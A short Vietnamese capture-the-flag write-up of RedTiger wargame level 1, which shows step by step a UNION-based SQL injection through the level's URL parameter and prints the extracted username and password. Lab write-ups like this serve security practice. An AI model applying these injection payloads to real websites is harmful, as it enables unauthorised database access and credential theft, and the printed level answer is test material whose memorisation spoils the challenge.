BÁO CÁO LEVEL 1

##**Mục tiêu của level 1**: Đăng nhập vào được với user Hornoxe

##**Phương pháp**:
	
**B1**:Tìm ra cột chứa dữ liệu username,password mình cần tìm:
	+Sử dụng câu lệnh `union select 1,2,3,...' . Cứ tăng số lên cho đến khi tìm được cột cần tìm
		
	+Kết quả với `http://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,3,4` thấy xuất hiện thêm trên trang web 2 số là `3 và 4`. Chứng tỏ dữ liệu username và password cần tìm nằm trên 2 cột đó

**B2**:Cột chứa dữ liệu đã được xác định. Tiếp theo là truy vấn vào và lấy dữ liệu:

	```sh
	http://redtiger.labs.overthewire.org/level1.php?cat=1%20union%20select%201,2,username,password%20from%20level1_users
	```
	Kết quả:
		username: Horxone
		password: thatwaseasy

			BÁO CÁO KẾT THÚC
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------








